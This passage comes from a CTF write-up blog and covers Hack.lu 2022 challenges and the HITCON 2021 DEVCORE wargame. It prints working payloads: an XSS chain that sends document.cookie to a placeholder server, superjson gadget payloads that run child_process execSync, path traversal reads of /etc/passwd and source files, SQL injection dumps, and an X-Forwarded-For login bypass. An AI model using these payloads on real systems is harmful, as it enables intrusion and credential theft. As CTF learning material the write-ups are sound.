\"a\"&lt;!--$1$; The final semicolon will be removed, so it can be combined with the [] in the next line to become an attribute access, like this: &lt;x-program> &lt;x-const> &lt;x-identifier>a&lt;/x-identifier> &lt;x-lt> &lt;x-str>x&lt;/x-str> &lt;x-not>&lt;x-dec> &lt;x-identifier>asd&lt;/x-identifier> &lt;/x-dec>&lt;/x-not> &lt;/x-lt> &lt;/x-const> &lt;x-array> &lt;x-str>toString&lt;/x-str> &lt;/x-array> &lt;/x-program> will be translated into: const write = (s) => alert(s); const read = (s) => prompt(s); const $a$=\"x\"&lt;!--$asd$; [\"toString\"]; which is const $a$=&quot;x&quot;[&quot;toString&quot;] It’s easy once you get here, just continue to get the function constructor and then call it, like this: &lt;x-program> &lt;x-const> &lt;x-identifier>a&lt;/x-identifier> &lt;x-lt> &lt;x-str>x&lt;/x-str> &lt;x-not>&lt;x-dec> &lt;x-identifier>asd&lt;/x-identifier> &lt;/x-dec>&lt;/x-not> &lt;/x-lt> &lt;/x-const> &lt;x-array> &lt;x-str>toString&lt;/x-str> &lt;/x-array> &lt;x-const> &lt;x-identifier>b&lt;/x-identifier> &lt;x-lt> &lt;x-identifier>a&lt;/x-identifier> &lt;x-not>&lt;x-dec> &lt;x-identifier>asd&lt;/x-identifier> &lt;/x-dec>&lt;/x-not> &lt;/x-lt> &lt;/x-const> &lt;x-array> &lt;x-str>constructor&lt;/x-str> &lt;/x-array> &lt;x-const> &lt;x-identifier>c&lt;/x-identifier> &lt;x-call> &lt;x-identifier>b&lt;/x-identifier> &lt;x-str>alert(\"xss\")&lt;/x-str> &lt;/x-call> &lt;/x-const> &lt;x-call> &lt;x-identifier>c&lt;/x-identifier> &lt;/x-call> &lt;/x-program> will become: const write = (s) => alert(s); const read = (s) => prompt(s); const $a$=\"x\"&lt;!--$asd$; [\"toString\"]; const $b$=$a$&lt;!--$asd$; [\"constructor\"]; const $c$=($b$)(\"alert(\\\"xss\\\")\"); ($c$)(); terjanq’s solution is shorter, directly using iframe + name to get the feature of window in the iframe, and then get the eval in the iframe (it doesn’t matter if you remove that if): &lt;iframe name=$win$>&lt;/iframe> &lt;x-program> &lt;x-if> &lt;x-num>1&lt;/x-num> &lt;x-const> &lt;x-identifier>test&lt;/x-identifier> &lt;x-lt> &lt;x-identifier>win&lt;/x-identifier> &lt;x-not>&lt;x-dec> &lt;x-identifier>asd&lt;/x-identifier> &lt;/x-dec>&lt;/x-not> &lt;/x-lt> &lt;/x-const> &lt;x-array> &lt;x-str>eval&lt;/x-str> &lt;/x-array> &lt;x-call> &lt;x-identifier>test&lt;/x-identifier> &lt;x-str>top.location='https://server/?c='+document.cookie&lt;/x-str> &lt;/x-call> &lt;/x-if> &lt;/x-program> The code will be: const write = (s) => alert(s); const read = (s) => prompt(s); if(1)&#123; const $test$=$win$&lt;!--$asd$; [\"eval\"]; ($test$)(\"alert(1337)\"); &#125;; JaaSon(6 solves)As a bonus, this is a misc JS problem. You can give a json string, which will be thrown into superjson. Although the version used has a prototype pollution vulnerability, it has already locked the prototype with Object.freeze(Object.prototype), so there is no prototype pollution that can be used. I haven’t had time to study this problem yet, but it is related to the internal operation mechanism of superjson. You can use referentialEqualities to specify some values, for example: &#123; \"json\": &#123; \"brands\": [ &#123; \"name\": \"Sonar\" &#125; ], \"products\": [ &#123; \"name\": \"SonarQube\", \"brand\": null &#125; ] &#125;, \"meta\": &#123; \"referentialEqualities\": &#123; \"brands.0\": [\"products.0.brand\"] &#125; &#125; &#125; It will execute products[0].brand = brands[0];, which seems to be intended to solve the reference problem when deep cloning. For more details, please refer to: Remote Code Execution via Prototype Pollution in Blitz.js, which explains it more comprehensively. I haven’t studied the other details, but it seems that some things in the object are replaced through this feature. Below is the payload posted by szymex73 in DC: &#123; \"json\":[ [ null, [ &#123; \"value\":\"console.log(global.process.mainModule.constructor._load('child_process').execSync('/readflag').toString())\" &#125; ] ] ], \"meta\":&#123; \"values\":&#123; \"2\":[ \"map\" ] &#125;, \"referentialEqualities\":&#123; \"constructor.prototype\":[ \"1\" ], \"find.constructor\":[ \"1.get\" ], \"push\":[ \"1.set\", \"1.delete\" ], \"pop\":[ \"1.next\", \"0.keys\", \"1.charAt\" ], \"2.constructor.prototype\":[ \"1.__proto__\", \"0.0\" ], \"0.2\":[ \"1.toString\" ], \"\":[ [ [ 1 ] ] ] &#125; &#125; &#125; Compared to the above, my teammate pew’s payload seems to be easier to understand: const superjson = require('superjson').default; Object.freeze(Object.prototype); javascript = `console.log(process.mainModule.require('child_process').execSync(\"/readflag\").toString())` var json = JSON.stringify( &#123; json: &#123; real_error: &#123; \"message\": \"\", &#125;, real_map: [], fake_map: [\"\"], real_str: \"xxd\", real_arr: [], x: javascript, js: javascript, &#125;, meta: &#123; referentialEqualities: &#123; 'real_error.toString': ['fake_map.toString'], 'constructor.constructor': ['fake_map.get'], 'real_str.replace': ['fake_map.set'], 'js': ['fake_map.name'], 'real_arr.constructor.prototype.values': ['fake_map.keys'], 'real_map.__proto__' : ['fake_map.__proto__'], 'x': ['fake_map.0'] &#125;, values: &#123; real_map: [ \"map\" ], real_error: [ \"Error\" ] &#125; &#125;, &#125; ) console.log(json) console.log(\"\") PostscriptThe problems this time are all very interesting and novel. For example, the Python problem only uses decorators to execute arbitrary code, which is very cool, or the foodAPI directly tests a denoDB 0-day, which is also quite powerful. The mysterious syntax of SQLite is also eye-opening. I look forward to someone posting a write-up in the future to explain which part of the code has that feature, and whether it is a feature or a bug. The final point of HTPL is actually the JS comment &lt;!--, but after being wrapped up, it is not so easy to find. This kind of “discovering familiar things after unpacking” is ideal for the problem. For example, like the gif problem, if I didn’t solve it, I would only think that my knowledge is insufficient and I don’t know that ..gif can be bypassed, or I would think that my ability to read code is insufficient and I can’t see too deeply. But for the HTPL problem, if I didn’t solve it but found that the knowledge point was something I knew, I would feel that the problem was packaged very cleverly. Suddenly I feel that it is similar to some of the problems in the past competitions. Some problems cannot be solved because I really haven’t learned that algorithm, but some problems are not too difficult after being broken down layer by layer, but they are packaged very well, so I will feel “Wow, this problem setter is so powerful.” By the way, terjanq is the GOAT in the CTF world for frontend, browser, and JS-related problems in my mind. I feel that as long as it is this type of problem, he can definitely solve it, which is really amazing. Of course, other strong players are not weak. Every time I find that the difficult problems are almost solved by those few people. XD","link":"/2022/10/31/en/hacklu-ctf-2022-writeup/"},{"title":"HITCON 2021 x DEVCORE Wargame Write-up","text":"HITCON 2021 DEVCORE organized a wargame, which can be found here: https://hackmd.io/@d3vc0r3/hitcon2021 It was stated that the game can be completed within two hours, so I decided to give it a try. However, due to my lack of experience, I got stuck in one part for a long time. Apart from that, the difficulty level was not high. This article briefly records the process and experience of solving the game. Solution NotesChallenge URL (may have been closed): http://web.ctf.devcore.tw/ After entering the website, it was obvious that there was a path traversal vulnerability in image.php, which could read any file as long as the path was base64 encoded: Let’s read /etc/passwd first: 123root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin irc:x:39:39:ircd:&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin _apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin # find PHP source code and you will get the flag. It was mentioned that the first flag can be obtained as long as the PHP source code is found. I tried some default PHP paths but to no avail. I remembered the Balsn CTF 2021 WriteUps I read last week, which introduced a magical path file:///proc/self/cwd. So I read /proc/self/cwd/index.php and successfully obtained the contents of index.php! Continuing to look for other related files based on what the file includes, we can find: error.php image.php include.php index.php lang.php order.php pdf.php print.php qrcode.php rate-limit.php receipt.php submit.php success.php We successfully obtained the first flag in include.php: &lt;?php /* _ ___ ___ _ __ __ __ __ __ | | / _ \\ / _ \\| |/ / __ __ __ __ \\ \\ / / \\ \\ / / | | | | | | | | | ' / \\ \\ / / \\ \\ / / \\ V / \\ V / | |__| |_| | |_| | . \\ \\ V / \\ V / \\_/ \\_/ |_____\\___/ \\___/|_|\\_\\ \\_/ \\_/ DEVCORE&#123;no.1_path_traverse_to_the_m00n&#125; */ define('IMAGE_PATH', '/usr/share/nginx/images/'); define('MYSQL_HOST', 'mysql'); define('MYSQL_USER', 'web_user'); define('MYSQL_PASSWORD', 'n%6GZgt*hH[+p7vJ'); define('MYSQL_DATABASE', 'web'); define('ORDER_STATUS_PICKING', 'PICKING'); define('ORDER_STATUS_PACKING', 'PACKING'); define('ORDER_STATUS_SENDING', 'SENDING'); define('ORDER_STATUS_DELIVERING', 'DELIVERING'); define('ORDER_STATUS_ARRIVED', 'ARRIVED'); define('ORDER_STATUS_FINISH', 'FINISH'); define('DEFAULT_LANGUAGE', 'zh-tw'); define('ALLOWED_LANGUAGE', 'zh-tw'); function session_start_once() &#123; if (!isset($_SESSION)) &#123; session_start(); &#125; &#125; session_start_once(); if (!isset($_SESSION['lang'])) &#123; $_SESSION['lang'] = DEFAULT_LANGUAGE; &#125; require_once('langs/' . $_SESSION['lang'] . '.php'); require_once('qrcode.php'); function base64_urlsafe_encode($input) &#123; return strtr(base64_encode($input), '+/', '._'); &#125; function base64_urlsafe_decode($input) &#123; return base64_decode(strtr($input, '._', '+/')); &#125; $GLOBALS['_pdo'] = false; function get_pdo() &#123; if ($GLOBALS['_pdo']) &#123; return $GLOBALS['_pdo']; &#125; try &#123; $pdo = new PDO( 'mysql:host='.MYSQL_HOST.';dbname='.MYSQL_DATABASE.';charset=utf8mb4', MYSQL_USER, MYSQL_PASSWORD, array( PDO::MYSQL_ATTR_INIT_COMMAND => 'SET NAMES \\'utf8mb4\\' COLLATE \\'utf8mb4_unicode_ci\\';', PDO::ATTR_TIMEOUT => 2 )); $GLOBALS['_pdo'] = $pdo; &#125; catch (Exception $e) &#123; http_response_code(500); die(\"Failed to connect database. Please contact the administrtor.\"); &#125; return $pdo; &#125; function get_post_param($key, $default=null) &#123; if (isset($_POST[$key])) &#123; return $_POST[$key]; &#125; else &#123; return $default; &#125; &#125; function get_get_param($key, $default=null) &#123; if (isset($_GET[$key])) &#123; return $_GET[$key]; &#125; else &#123; return $default; &#125; &#125; function get_client_ip() &#123; if (!empty($_SERVER['HTTP_CLIENT_IP'])) &#123; $ip = $_SERVER['HTTP_CLIENT_IP']; &#125; else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) &#123; $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; &#125; else &#123; $ip = $_SERVER['REMOTE_ADDR']; &#125; return $ip; &#125; function random_str( int $length = 64, string $keyspace = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' ): string &#123; if ($length &lt; 1) &#123; throw new \\RangeException(\"Length must be a positive integer\"); &#125; $pieces = []; $max = mb_strlen($keyspace, '8bit') - 1; for ($i = 0; $i &lt; $length; ++$i) &#123; $pieces []= $keyspace[random_int(0, $max)]; &#125; return implode('', $pieces); &#125; function get_sig_hash($data) &#123; $pdo = get_pdo(); $res = $pdo->query(\"SELECT `value` FROM options WHERE `key` = 'sig_secret' LIMIT 1\", PDO::FETCH_ASSOC); $row = $res->fetch(); if (!$row) &#123; $secret = random_str(64); $pdo->exec(\"INSERT INTO options VALUES ('sig_secret', '\".$secret.\"'), ('sig_algorithm', 'sha256')\"); &#125; else &#123; $secret = $row['value']; &#125; $res = $pdo->query(\"SELECT `value` FROM options WHERE `key` = 'sig_algorithm' LIMIT 1\", PDO::FETCH_ASSOC); $algo = $res->fetch()['value']; return hash_hmac($algo, $data, $secret); &#125; function get_timezone() &#123; $pdo = get_pdo(); $res = $pdo->query(\"SELECT `value` FROM options WHERE `key` = 'timezone' LIMIT 1\", PDO::FETCH_ASSOC); $row = $res->fetch(); if (!$row) &#123; $pdo->exec(\"INSERT INTO options VALUES ('timezone', 'Asia/Taipei')\"); $timezone = 'Asia/Taipei'; &#125; else &#123; $timezone = $row['value']; &#125; return $timezone; &#125; define('TIMEZONE', get_timezone()); date_default_timezone_set(TIMEZONE); function endsWith( $haystack, $needle ) &#123; $length = strlen( $needle ); if( !$length ) &#123; return true; &#125; return substr( $haystack, -$length ) === $needle; &#125; function order_status_to_text($status) &#123; $text_arr = [ ORDER_STATUS_PICKING => '撿貨', ORDER_STATUS_PACKING => '包裝中', ORDER_STATUS_SENDING => '等待貨運士取貨', ORDER_STATUS_DELIVERING => '配送中', ORDER_STATUS_ARRIVED => '貨物已送達', ORDER_STATUS_FINISH => '完成' ]; return $text_arr[$status]; &#125; Next, I looked at each file and found that print.php had an obvious SQL Injection: &lt;?php require_once('include.php'); require_once('third_party/vendor/autoload.php'); //require_once('rate_limit.php'); // rate limit is not working, use random sleep as a workaround sleep(random_int(0, 2)); $is_from_print = true; $id = get_get_param('id', ''); $sig = get_get_param('sig', ''); $sig_hash = get_sig_hash($sig); $pdo = get_pdo(); $res = $pdo->query(\" SELECT * FROM orders WHERE sig_hash = '$sig_hash' AND id = $id LIMIT 1 \", PDO::FETCH_ASSOC); try &#123; $order = $res->fetch(); &#125; catch (Error $e) &#123; $order = []; &#125; ob_start(); include('pdf.php'); $html = ob_get_clean(); $mpdf = new \\Mpdf\\Mpdf([ 'tempDir' => '/tmp', 'autoScriptToLang' => true, 'autoLangToFont' => true, 'mode' => 'utf-8' ]); $mpdf->SetTitle('收據明細'); $mpdf->SetSubject('收據明細'); $mpdf->SetAuthor(random_str((random_int(1, 256)))); $mpdf->SetCreator(random_str((random_int(1, 256)))); $mpdf->WriteHTML($html); $mpdf->Output(); After manually injecting, the following information was obtained: table: rate_limit ip,last_visit,visit_times table: items id,title,description table: options key,value table: backend_users id,username,password,description admin u&#x3D;479_p5jV:Fsq(2 table: orders id,name,email,phone,status,sig_hash,order_date,address,note Since only one row of data can be obtained, GROUP_CONCAT can be used to dump data, like this: SELECT 1,GROUP_CONCAT(note),GROUP_CONCAT(name),GROUP_CONCAT(email),5,6,7,8,9 FROM orders The third flag (yes, the third, not the second) and a set of credentials were found in the backend_users section of the database, which may be useful later. According to include.php, we got this path: third_party/vendor/autoload.php. It was obvious that composer was used, so we could read /proc/self/cwd/third_party/composer.json to find out that only one package called mpdf was used. Next, let’s search for known vulnerabilities. We found an issue reported by DEVCORE on the official website: phar:&#x2F;&#x2F; deserialization and weak randomness of temporary file name may lead to RCE From this issue, we can learn two things: We can write files to /tmp/mpf/_tempCSSidataX_0.jpeg We can use &lt;img src=&quot;#1.jpeg&quot; ORIG_SRC=&quot;phar://../vendor/mpdf/mpdf/tmp/mpdf/_tempCSSidata1_0.jpeg/a.jpg&quot;&gt;&lt;/img&gt; to perform deserialization However, the problem is that we need to find a gadget that can be used to trigger the attack by deserialization. After installing the same package locally, I directly searched for methods starting with __ in the third_party folder, but only found some useless things. I couldn’t think of a POP attack chain. So I got stuck. I thought and looked at it repeatedly, except for the possibility of exploiting the phar vulnerability, the only other thing is the part in include.php that imports $_SESSION[&#39;lang&#39;]. If we can control lang, we can import any file, but the problem is that there is no vulnerability in lang.php that can be exploited to control parameters, unless we can directly modify /tmp/sess_XXX, otherwise we can’t get in. But the only vulnerability that can write files is in mpdf, but the file name is restricted and cannot be written anywhere, otherwise the two can be combined. There is also a strange place that I can’t figure out. I hacked into a set of backend account passwords in the DB, but there should be a backend, where is it? Usually, when doing this kind of wargame or CTF, enumeration is not necessary, but because I really have no clue, I had to start searching. I used ffuf to scan any place that I thought might be possible, but I got nothing, so I had no clue and didn’t know what to do next. The wargame started at 9 am on Saturday, and I solved the first two flags at 10 am, and then I got stuck all day. That night, I checked and found that only 6 people had solved it, but there were many NFTs, so I asked in the chat room if there were any plans to release some hints if the solving situation was not as expected. Later, I got a reply asking what kind of information I needed. Because the solving time was set to be until 6 pm on Sunday (the end of HITCON), I thought I would wait until it was over to ask for hints, which explained my situation (solved 1 and 3 and got stuck). Later, I got a reply saying to observe vulnerability 1 again to see if there is anything like a backend. So I tried various paths again, and finally tried something I had seen before but had not tried: /proc/mounts, the content looks like this: overlay &#x2F; overlay rw,relatime,lowerdir&#x3D;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;DVIDOZY6PBLWVCFYWII5AAUIJZ:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;3CV53MMJRHWIZWOHD5WPBJANGZ:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;VIRCM74GAO2ULIS6SHAVLYHI7O:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;QC5SROY6OOIX6VQUNGJG3T5GMY:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;3Z7BTZXFISPKXE3DEG4OUPAB5G:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;GDBX5T35WQSMHIY2USJLX6SPRU:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;WHFI4IRDVNIOO6MLKCKKAMYQKB:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;JLXT6H6QNKB45UIDZANGKVGLPD:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;M756SQ7NRKEJCKLHPB2PRKG5Z2:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;OY2PWIL6ISIIORC7LZNWWQ6JKN:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;GXC3IEBX7YVRSOMH34OAE6Y5LV:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;FNJ3ZWM4WCOCANHBZPBTO47K5B:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;NRVSBMR3SAZ3PNE5KXGMUQMODK:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;2MARFWCP5GVEAG5IBUMLJTABKL:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;F67HXFSPANXFWKRP2R5YJHJRBE:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;AKYB2LUEDDQPLGHVXECL72U4MK:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;B7CFODJXDKC3HEX5ZJD7NAID5A:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;5XQVILRBQTSFRMEKB7YW6UTYLB:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;6ZMT3PTB6QFDZ2PJOURGMQZIMJ:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;4AUQ72KT7D5WLPX3GCGBI576ZS:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;HEF7KMRLHAUNHLXAPU5T4QFJJD:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;ZEPQYM2UZQKKXKJS62CP5RIRKN:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;4BBAOHRGSZ3TVLTD4ZICVZS7C7:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;3K7P7JABJCB4HT5HZRXGBFSSAU:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;GUW5ZGQOABGYH7KF5IU5JFHG6E:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;RKL5CJMH6X7ORW4XAB5HJ3RJ3C:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;ZLWG5Z6C6FD3OQEJCZHJHODTTX:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;QLSXNQZKZQQ3YDAFJ675RXRFWL:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;KHQSPHLSLWASTCLEBPKWK7AABD:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;GCM3GAH2MB2FBUK2NUGCCQ6H6R:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;FVHE6ZGSGB26C3JN35T36U575B:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;A3B3RQ7O6RTEZTZDFCBNL3R2IG:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;VWEM5H2WW7HEKTCLCWBPPEV4RA:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;QAYAOZL2DM73CJVN7Y3J7MRXDP:&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;l&#x2F;CGI6OQSFKKJRGSKZASWCHJDJIM,upperdir&#x3D;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;ea857d9fda05b6fb0c5b7d79544f8d05943163aec8ecce2c8aaede2a93bd0b1b&#x2F;diff,workdir&#x3D;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;ea857d9fda05b6fb0c5b7d79544f8d05943163aec8ecce2c8aaede2a93bd0b1b&#x2F;work 0 0 proc &#x2F;proc proc rw,nosuid,nodev,noexec,relatime 0 0 tmpfs &#x2F;dev tmpfs rw,nosuid,size&#x3D;65536k,mode&#x3D;755 0 0 devpts &#x2F;dev&#x2F;pts devpts rw,nosuid,noexec,relatime,gid&#x3D;5,mode&#x3D;620,ptmxmode&#x3D;666 0 0 sysfs &#x2F;sys sysfs ro,nosuid,nodev,noexec,relatime 0 0 tmpfs &#x2F;sys&#x2F;fs&#x2F;cgroup tmpfs rw,nosuid,nodev,noexec,relatime,mode&#x3D;755 0 0 cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd cgroup ro,nosuid,nodev,noexec,relatime,xattr,name&#x3D;systemd 0 0 cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;freezer cgroup ro,nosuid,nodev,noexec,relatime,freezer 0 0 cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;hugetlb cgroup ro,nosuid,nodev,noexec,relatime,hugetlb 0 0 cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpu,cpuacct cgroup ro,nosuid,nodev,noexec,relatime,cpu,cpuacct 0 0 cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;perf_event cgroup ro,nosuid,nodev,noexec,relatime,perf_event 0 0 cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;net_cls,net_prio cgroup ro,nosuid,nodev,noexec,relatime,net_cls,net_prio 0 0 cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;pids cgroup ro,nosuid,nodev,noexec,relatime,pids 0 0 cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;rdma cgroup ro,nosuid,nodev,noexec,relatime,rdma 0 0 cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;blkio cgroup ro,nosuid,nodev,noexec,relatime,blkio 0 0 cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;devices cgroup ro,nosuid,nodev,noexec,relatime,devices 0 0 cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory cgroup ro,nosuid,nodev,noexec,relatime,memory 0 0 cgroup &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpuset cgroup ro,nosuid,nodev,noexec,relatime,cpuset 0 0 mqueue &#x2F;dev&#x2F;mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0 shm &#x2F;dev&#x2F;shm tmpfs rw,nosuid,nodev,noexec,relatime,size&#x3D;65536k 0 0 &#x2F;dev&#x2F;sda &#x2F;etc&#x2F;hosts ext4 rw,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0 &#x2F;dev&#x2F;sda &#x2F;etc&#x2F;resolv.conf ext4 rw,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0 &#x2F;dev&#x2F;sda &#x2F;etc&#x2F;hostname ext4 rw,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0 &#x2F;dev&#x2F;sda &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;frontend ext4 ro,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0 &#x2F;dev&#x2F;sda &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;images ext4 rw,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0 &#x2F;dev&#x2F;sda &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;b8ck3nd ext4 ro,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0 &#x2F;dev&#x2F;sda &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.ini ext4 ro,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0 proc &#x2F;proc&#x2F;bus proc ro,nosuid,nodev,noexec,relatime 0 0 proc &#x2F;proc&#x2F;fs proc ro,nosuid,nodev,noexec,relatime 0 0 proc &#x2F;proc&#x2F;irq proc ro,nosuid,nodev,noexec,relatime 0 0 proc &#x2F;proc&#x2F;sys proc ro,nosuid,nodev,noexec,relatime 0 0 proc &#x2F;proc&#x2F;sysrq-trigger proc ro,nosuid,nodev,noexec,relatime 0 0 tmpfs &#x2F;proc&#x2F;acpi tmpfs ro,relatime 0 0 tmpfs &#x2F;proc&#x2F;kcore tmpfs rw,nosuid,size&#x3D;65536k,mode&#x3D;755 0 0 tmpfs &#x2F;proc&#x2F;keys tmpfs rw,nosuid,size&#x3D;65536k,mode&#x3D;755 0 0 tmpfs &#x2F;proc&#x2F;timer_list tmpfs rw,nosuid,size&#x3D;65536k,mode&#x3D;755 0 0 tmpfs &#x2F;proc&#x2F;sched_debug tmpfs rw,nosuid,size&#x3D;65536k,mode&#x3D;755 0 0 tmpfs &#x2F;proc&#x2F;scsi tmpfs ro,relatime 0 0 tmpfs &#x2F;sys&#x2F;firmware tmpfs ro,relatime 0 0 Inside, you can directly see several important paths: &#x2F;dev&#x2F;sda &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;frontend ext4 ro,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0 &#x2F;dev&#x2F;sda &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;images ext4 rw,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0 &#x2F;dev&#x2F;sda &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;b8ck3nd ext4 ro,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0 &#x2F;dev&#x2F;sda &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.ini ext4 ro,relatime,errors&#x3D;remount-ro,data&#x3D;ordered 0 0 Yes, I missed this at the beginning, and it took me a whole day to find it. After finding this, things became easier. When I entered b8ck3nd/index.php, I was directly redirected to the homepage. I remembered some utils functions I saw in include.php and tried adding X-Forwarded-For: 127.0.0.1 to bypass it and go to the login page. The login account and password used the one I got from the SQL injection earlier. After successfully logging in, I got the fourth flag. Then I found an upload.php in the backend, which can upload any file: &lt;?php require_once('include.php'); if ($_SERVER['REQUEST_METHOD'] == 'GET') &#123; header('Content-Type: text/plain'); echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkZha2UgdG9rZW4gZm9yIGNrZWRpdG9yIiwiaWF0IjoxNTE2MjM5MDIyfQ.6nNLxp10uP65V_NFrs5IWuX2tkk6vGQ-oiwYhHNdHgk'; exit(); &#125; if (isset($_FILES['file']) &amp;&amp; is_uploaded_file($_FILES['file']['tmp_name'])) &#123; header('Content-Type: application/json; charset=utf-8'); $ext = pathinfo($_FILES['file']['name'], 